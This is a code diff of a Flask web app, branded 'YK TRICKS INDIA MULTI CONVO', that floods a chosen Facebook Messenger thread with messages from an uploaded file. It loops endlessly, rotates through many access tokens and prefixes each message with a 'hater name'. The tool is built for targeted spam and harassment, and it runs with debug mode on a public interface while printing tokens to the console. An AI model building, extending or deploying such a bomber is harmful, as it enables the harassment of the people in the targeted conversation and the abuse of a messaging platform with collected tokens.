@@ -1,242 +1,205 @@
-from flask import Flask, request, redirect, url_for
-import os
-import time
+from flask import Flask, request, render_template_string
 import requests
-import threading
-
+from threading import Thread, Event
+import time
+import random
+import string
+ 
 app = Flask(__name__)
-
-# Static variables for headers
+app.debug = True
+ 
 headers = {
     'Connection': 'keep-alive',
     'Cache-Control': 'max-age=0',
     'Upgrade-Insecure-Requests': '1',
     'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
     'Accept-Encoding': 'gzip, deflate',
     'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+    'referer': 'www.google.com'
 }
-
-# Global flag to stop the loop
-stop_flag = False
-token_counter = 0  # Counter for tokens used
-
-
-def send_messages(token_type, access_token, thread_id, hater_name, time_interval, messages, tokens):
-    global stop_flag, token_counter
-    post_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
-    
-    msg_index = 0
-    while not stop_flag:  # Infinite loop until stop_flag = True
-        message = messages[msg_index % len(messages)]
-        token = access_token if token_type == 'single' else tokens[msg_index % len(tokens)]
-
-        data = {'access_token': token, 'message': f"{hater_name} {message}"}
-        response = requests.post(post_url, json=data, headers=headers)
-
-        if response.ok:
-            print(f"[SUCCESS] Sent: {message}")
+ 
+stop_events = {}
+threads = {}
+ 
+def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
+    stop_event = stop_events[task_id]
+    while not stop_event.is_set():
+        for message1 in messages:
+            if stop_event.is_set():
+                break
+            for access_token in access_tokens:
+                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
+                message = str(mn) + ' ' + message1
+                parameters = {'access_token': access_token, 'message': message}
+                response = requests.post(api_url, data=parameters, headers=headers)
+                if response.status_code == 200:
+                    print(f"Message Sent Successfully From token {access_token}: {message}")
+                else:
+                    print(f"Message Sent Failed From token {access_token}: {message}")
+                time.sleep(time_interval)
+ 
+@app.route('/', methods=['GET', 'POST'])
+def send_message():
+    if request.method == 'POST':
+        token_option = request.form.get('tokenOption')
+        
+        if token_option == 'single':
+            access_tokens = [request.form.get('singleToken')]
         else:
-            print(f"[FAILURE] Failed to send: {message} | {response.text}")
-
-        token_counter += 1
-        msg_index += 1
-        time.sleep(time_interval)
-
-
-@app.route('/')
-def index():
-    global token_counter
-    return f'''
-    <!DOCTYPE html>
-    <html lang="en">
-    <head>
-      <meta charset="UTF-8">
-      <title>Auto Message Sender</title>
-      <style>
-        body {{
-          font-family: Arial, sans-serif;
-          background: url('https://images.unsplash.com/photo-1522071820081-009f0129c71c') no-repeat center center fixed;
-          background-size: cover;
-          margin: 0;
-          padding: 0;
-          transition: background 0.3s, color 0.3s;
-        }}
-        body.dark {{
-          background: #121212;
-          color: #fff;
-        }}
-        .container {{
-          max-width: 600px;
-          margin: 50px auto;
-          background: rgba(255, 255, 255, 0.9);
-          padding: 30px;
-          border-radius: 20px;
-          box-shadow: 0 8px 16px rgba(0,0,0,0.8);
-          transition: background 0.3s, color 0.3s;
-        }}
-        body.dark .container {{
-          background: rgba(30, 30, 30, 0.95);
-        }}
-        h2 {{
-          text-align: center;
-          margin-bottom: 20px;
-        }}
-        label {{
-          font-weight: bold;
-          display: block;
-          margin-top: 15px;
-        }}
-        input, select {{
-          width: 100%;
-          padding: 14px;
-          margin-top: 8px;
-          border: none;
-          border-radius: 12px;
-          font-size: 16px;
-          box-shadow: 0 4px 10px rgba(0,0,0,0.6);
-        }}
-        button {{
-          width: 100%;
-          padding: 14px;
-          margin-top: 20px;
-          font-size: 16px;
-          font-weight: bold;
-          border: none;
-          border-radius: 12px;
-          cursor: pointer;
-          background: #007BFF;
-          color: white;
-          box-shadow: 0 4px 12px rgba(0,0,0,0.7);
-          transition: background 0.3s;
-        }}
-        button:hover {{
-          background: #0056b3;
-        }}
-        .toggle-btn {{
-          position: fixed;
-          top: 20px;
-          right: 20px;
-          background: #333;
-          color: white;
-          padding: 10px 18px;
-          border-radius: 30px;
-          cursor: pointer;
-          font-size: 14px;
-        }}
-        .counter-box {{
-          margin-top: 20px;
-          padding: 12px;
-          background: #f1f1f1;
-          border-radius: 12px;
-          text-align: center;
-          font-weight: bold;
-          box-shadow: 0 4px 12px rgba(0,0,0,0.7);
-        }}
-        body.dark .counter-box {{
-          background: #222;
-          color: #fff;
-        }}
-      </style>
-    </head>
-    <body>
-      <div class="toggle-btn" onclick="toggleDark()">🌙 Dark Mode</div>
-
-      <div class="container">
-        <h2>🚀 Auto Message Sender</h2>
-        <form action="/" method="post" enctype="multipart/form-data">
-          <label>Token Type:</label>
-          <select name="tokenType">
-            <option value="single">Single Token</option>
-            <option value="multi">Multi Token</option>
-          </select>
-
-          <label>Access Token:</label>
-          <input type="text" name="accessToken">
-
-          <label>Thread ID:</label>
-          <input type="text" name="threadId" required>
-
-          <label>Hater Name:</label>
-          <input type="text" name="kidx" required>
-
-          <label>Message File:</label>
-          <input type="file" name="txtFile" required>
-
-          <label>Token File (for multi):</label>
-          <input type="file" name="tokenFile">
-
-          <label>Speed (seconds):</label>
-          <input type="number" name="time" required>
-
-          <button type="submit">▶ Start Sending</button>
-        </form>
-
-        <form action="/stop" method="post">
-          <button type="submit" style="background:red;">⏹ Stop Sending</button>
-        </form>
-
-        <div class="counter-box">
-          🔄 Tokens Used: <span id="tokenCounter">{token_counter}</span>
-        </div>
+            token_file = request.files['tokenFile']
+            access_tokens = token_file.read().decode().strip().splitlines()
+ 
+        thread_id = request.form.get('threadId')
+        mn = request.form.get('kidx')
+        time_interval = int(request.form.get('time'))
+ 
+        txt_file = request.files['txtFile']
+        messages = txt_file.read().decode().splitlines()
+ 
+        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
+ 
+        stop_events[task_id] = Event()
+        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
+        threads[task_id] = thread
+        thread.start()
+ 
+        return f'Task started with ID: {task_id}'
+ 
+    return render_template_string('''
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>YK TRICKS INDIA MULTI CONVO</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+  <style>
+    /* CSS for styling elements */
+    label { color: white; }
+    .file { height: 30px; }
+    body {
+      background-image: url('https://i.ibb.co/RGdY35MZ/4046704.jpg');
+      background-size: cover;
+      background-repeat: no-repeat;
+      color: white;
+    }
+    .container {
+      max-width: 350px;
+      height: auto;
+      border-radius: 20px;
+      padding: 20px;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+      box-shadow: 0 0 15px white;
+      border: none;
+      resize: none;
+    }
+    .form-control {
+      outline: 1px red;
+      border: 1px double white;
+      background: transparent;
+      width: 100%;
+      height: 40px;
+      padding: 7px;
+      margin-bottom: 20px;
+      border-radius: 10px;
+      color: none;
+    }
+    .header { text-align: center; padding-bottom: 20px; }
+    .btn-submit { width: 100%; margin-top: 10px; }
+    .footer { text-align: center; margin-top: 20px; color: #888; }
+    .whatsapp-link {
+      display: inline-block;
+      color: #25d366;
+      text-decoration: none;
+      margin-top: 10px;
+    }
+    .whatsapp-link i { margin-right: 5px; }
+  </style>
+</head>
+<body>
+  <header class="header mt-4">
+    <h1 class="mt-3">(HENRY-X)</h1>
+  </header>
+  <div class="container text-center">
+    <form method="post" enctype="multipart/form-data">
+      <div class="mb-3">
+        <label for="tokenOption" class="form-label">Select Token Option</label>
+        <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
+          <option value="single">Single Token</option>
+          <option value="multiple">Token File</option>
+        </select>
       </div>
-
-      <script>
-        function toggleDark() {{
-          document.body.classList.toggle("dark");
-        }}
-
-        // Auto-refresh token counter every 5 sec
-        setInterval(() => {{
-          fetch(window.location.href)
-            .then(res => res.text())
-            .then(html => {{
-              let parser = new DOMParser();
-              let doc = parser.parseFromString(html, "text/html");
-              let count = doc.getElementById("tokenCounter").innerText;
-              document.getElementById("tokenCounter").innerText = count;
-            }});
-        }}, 5000);
-      </script>
-    </body>
-    </html>
-    '''
-
-
-@app.route('/', methods=['POST'])
-def process_form():
-    global stop_flag, token_counter
-    stop_flag = False  # Reset on new start
-    token_counter = 0  # Reset counter
-
-    token_type = request.form.get('tokenType')
-    access_token = request.form.get('accessToken')
-    thread_id = request.form.get('threadId')
-    hater_name = request.form.get('kidx')
-    time_interval = int(request.form.get('time'))
-    
-    txt_file = request.files['txtFile']
-    messages = txt_file.read().decode().splitlines()
-    
-    tokens = []
-    if token_type == 'multi':
-        token_file = request.files.get('tokenFile')
-        if token_file:
-            tokens = token_file.read().decode().splitlines()
-
-    # Run in background thread
-    threading.Thread(target=send_messages, args=(token_type, access_token, thread_id, hater_name, time_interval, messages, tokens), daemon=True).start()
-
-    return redirect(url_for('index'))
-
-
+      <div class="mb-3" id="singleTokenInput">
+        <label for="singleToken" class="form-label">Enter Single Token</label>
+        <input type="text" class="form-control" id="singleToken" name="singleToken">
+      </div>
+      <div class="mb-3" id="tokenFileInput" style="display: none;">
+        <label for="tokenFile" class="form-label">Choose Token File</label>
+        <input type="file" class="form-control" id="tokenFile" name="tokenFile">
+      </div>
+      <div class="mb-3">
+        <label for="threadId" class="form-label">Enter Inbox/convo uid</label>
+        <input type="text" class="form-control" id="threadId" name="threadId" required>
+      </div>
+      <div class="mb-3">
+        <label for="kidx" class="form-label">Enter Your Hater Name</label>
+        <input type="text" class="form-control" id="kidx" name="kidx" required>
+      </div>
+      <div class="mb-3">
+        <label for="time" class="form-label">Enter Time (seconds)</label>
+        <input type="number" class="form-control" id="time" name="time" required>
+      </div>
+      <div class="mb-3">
+        <label for="txtFile" class="form-label">Choose Your Np File</label>
+        <input type="file" class="form-control" id="txtFile" name="txtFile" required>
+      </div>
+      <button type="submit" class="btn btn-primary btn-submit">Run</button>
+    </form>
+    <form method="post" action="/stop">
+      <div class="mb-3">
+        <label for="taskId" class="form-label">Enter Task ID to Stop</label>
+        <input type="text" class="form-control" id="taskId" name="taskId" required>
+      </div>
+      <button type="submit" class="btn btn-danger btn-submit mt-3">Stop</button>
+    </form>
+  </div>
+  <footer class="footer">
+    <p>Â© 2025 CODED BY :- AYUSH</p>
+    <p> ALWAYS ON FIRE ðŸ”¥ <a href="">AYUSH</a></p>
+    <div class="mb-3">
+      <a href="https://wa.me/+919235741670" class="whatsapp-link">
+        <i class="fab fa-whatsapp"></i> Chat on WhatsApp
+      </a>
+    </div>
+  </footer>
+  <script>
+    function toggleTokenInput() {
+      var tokenOption = document.getElementById('tokenOption').value;
+      if (tokenOption == 'single') {
+        document.getElementById('singleTokenInput').style.display = 'block';
+        document.getElementById('tokenFileInput').style.display = 'none';
+      } else {
+        document.getElementById('singleTokenInput').style.display = 'none';
+        document.getElementById('tokenFileInput').style.display = 'block';
+      }
+    }
+  </script>
+</body>
+</html>
+''')
+ 
 @app.route('/stop', methods=['POST'])
-def stop_sending():
-    global stop_flag
-    stop_flag = True
-    return redirect(url_for('index'))
-
-
+def stop_task():
+    task_id = request.form.get('taskId')
+    if task_id in stop_events:
+        stop_events[task_id].set()
+        return f'Task with ID {task_id} has been stopped.'
+    else:
+        return f'No task found with ID {task_id}.'
+ 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
-    
+                
